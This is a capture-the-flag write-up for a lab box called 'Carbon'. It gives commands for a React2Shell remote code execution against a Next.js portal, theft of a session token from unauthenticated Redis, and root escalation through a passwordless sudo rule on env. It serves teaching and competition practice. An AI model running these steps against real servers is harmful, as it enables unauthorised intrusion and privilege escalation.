---
title: "Carbon"
ctf: "platypwnies 2026"
date: 2026-11-14
category: fullpwn
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::oxVLsVhhGUOQ} (user — /home/operator/user.txt)"
 - "PP{0p3r4t0r_3nv_1s_r00t::oh5K0X2KtiAP} (root — /root/root.txt)"
---

# Carbon

**Target:** `http://10.83.5.73:3000/portal` (live instance)
**Box:** k8s pod `carbon-5cddcd57cb-bxjv4`, kernel `4.19.0-gvisor` (gVisor sandbox)

## Summary

"Platypus Freight" ships a Next.js **15.5.6** customer portal (React 19.2.0, App Router) with a
single server action, `queueEmissionsReport`. Version < 15.5.7 is vulnerable to **React2Shell**
(CVE-2025-66478 / CVE-2025-55182): a prototype-pollution / path-traversal bug in the React
Flight *reply* deserialiser lets an unauthenticated attacker reach `Function` and execute
code, **before** the action ID is even validated. The foothold process is `nextjs`. From there,
a world-readable `/entrypoint.sh` discloses the scheme: the operator's OS password equals
`sha256("carbon-operator:"+FLAG_USER)[:24]`, that password is only handed out by an internal admin
API to a caller holding the operator session, and the ops dashboard keeps that session token in
an **unauthenticated Redis** at `127.0.0.1:6379`. Read the token, ask the admin API for the
credential, `su operator` for the user flag, then walk a leftover passwordless `sudo` rule on
`/usr/bin/env` to root.

The two decoys that cost time: the report form's three input fields (all sanitised — see below)
and `.env.local` (dead/rotated DB URL with masked creds).

## Solution / Exploit

### Step 1 — Foothold: React2Shell (CVE-2025-66478 / CVE-2025-55182)

The portal is Next.js **15.5.6** (`package.json`) with a server action
`queueEmissionsReport` (id `60f4f9bc7abe671ede01b0b6a7e45bdb2985d7ec33`, leaked in
`page.js`). We used the public toolkit `freeqaz/react2shell`
(<https://github.com/freeqaz/react2shell>).

Detection (non-destructive — POST any route with a `Next-Action: x` header and a crafted
multipart body; a vulnerable build answers HTTP 500 with a `E{"digest":...}` body):

```bash
./react2shell/detect.sh http://10.83.5.73:3000/portal
# -> VULNERABLE
```

Command execution, stdout exfiltrated via the `x-action-redirect` header (HTTP 303):

```bash
./react2shell/exploit-redirect.sh http://10.83.5.73:3000/portal "id"
# -> uid=1001(nextjs) gid=1001(nextjs) groups=1001(nextjs)
```

Our robust runner wraps the payload and JSON-escapes the command, because **an unescaped double
quote inside `CMD` breaks the Flight payload** (the trap that made the first attempts return
`[rce failed]`):

```bash
# rce.sh <url> '<cmd>'
./rce.sh http://10.83.5.73:3000/portal 'cat /entrypoint.sh'
```

The core payload (part 0 of the multipart body) is the standard prototype-chain hop
`$1:__proto__:then` → `Chunk.prototype.then` → fake `resolved_model` chunk whose
`_response._formData.get` is the `Function` constructor and `_response._prefix` is the attacker
JS — see `react2shell/PAYLOAD_REFERENCE.md` and `react2shell/EXPLOIT_NOTES.md` for the full
line-by-line trace of `ReactFlightReplyServer.js`.

> **Dead end:** the visible "Request an emissions report" form (fields `account`, `quarter`,
> `kind`) is *not* the bug. All three are sanitised by **split-on-`;`**, so `PF-123456;id` only
> queues a report for `PF-123456`. `post.sh` demonstrates this — no command injection there. The
> RSC deserialisation bug is the real door.

### Step 2 — nextjs → operator (cached-session replay)

`/entrypoint.sh` is world-readable and leaks the whole design:

- The operator OS password is `sha256("carbon-operator:" + FLAG_USER)[:24]`.
- `/opt/carbon/ops-notes.md` (0644) adds that the operator password is only handed out by the
 internal admin API to a caller presenting the **operator session**.
- The ops dashboard keeps that session token in **Redis** at `127.0.0.1:6379` with **no auth**,
 key `session:operator` (short TTL; the dashboard refreshes it, so read it live).

```bash
T=$(redis-cli -h 127.0.0.1 -p 6379 GET session:operator) # e.g. DIpRyjE4PI-CD57HkiXT-CFCPVeIx8CX
curl -s -H "Authorization: Bearer $T" http://127.0.0.1:9000/admin/operator-credential
# -> 433c41611683e1a345c3276b
printf '433c41611683e1a345c3276b\n' | su operator -c 'cat /home/operator/user.txt'
# -> PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::oxVLsVhhGUOQ}
```

### Step 3 — operator → root (leftover GTFOBins sudo rule)

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/env
sudo -n /usr/bin/env bash -c 'cat /root/root.txt'
# -> PP{0p3r4t0r_3nv_1s_r00t::oh5K0X2KtiAP}
```

`ops-notes.md` even flags it as a TODO — *"drop the temporary sudo rule for operator once the env
check script exists"* — the leftover rule is the bug.

## Flag(s)

```
PP{c4rb0n_c4ch3d_s3ss10n_r3pl4y::oxVLsVhhGUOQ} # user — /home/operator/user.txt
PP{0p3r4t0r_3nv_1s_r00t::oh5K0X2KtiAP} # root — /root/root.txt
```

## Notes / Pitfalls

- **JSON-escape the command.** Double quotes inside the RCE command must be JSON-escaped or the
 Flight multipart payload breaks and you get no output. `rce.sh` uses Python `json.dumps` to
 build `_prefix`, which is why it is reliable and `exploit-*.sh` one-liners are fragile.
- **The report form is a decoy** (split-on-`;` sanitisation on every field). Don't burn time on
 injection there.
- **`.env.local` is a decoy** — DB URL is dead/rotated, credentials masked.
- Redirect mode (HTTP 303, output in `x-action-redirect`) works in *production*; throw mode
 (HTTP 500, output in the error body) is sanitised to `{digest}` in production. Use redirect.
- The Redis token has a short TTL. If `GET session:operator` returns nil, re-trigger the
 dashboard (the dashboard refreshes it) and read again immediately.

## Artifacts in this folder

| Path | What |
|---|---|
| `CARBON-SOLVE.md` | Original working solve notes (author) |
| `rce.sh` | Robust React2Shell exec runner (`rce.sh <url> '<cmd>'`) |
| `post.sh` | Server-action form poster used to prove the `;` sanitisation |
| `page.js`, `main-app-c77ba0192178b1ce.js`, `255-3a69e70a8401eb51.js` | Portal JS bundles (action id, form) |
| `portal_index.html` | Portal landing page |
| `nmap_carbon.txt` | nmap of the target |
| `react2shell/` | Cloned `freeqaz/react2shell` toolkit (detect/exploit scripts, `PAYLOAD_REFERENCE.md`, `EXPLOIT_NOTES.md`, vulnerable test server) |
| `chall-info.txt`, `challenge.json` | Platform metadata |
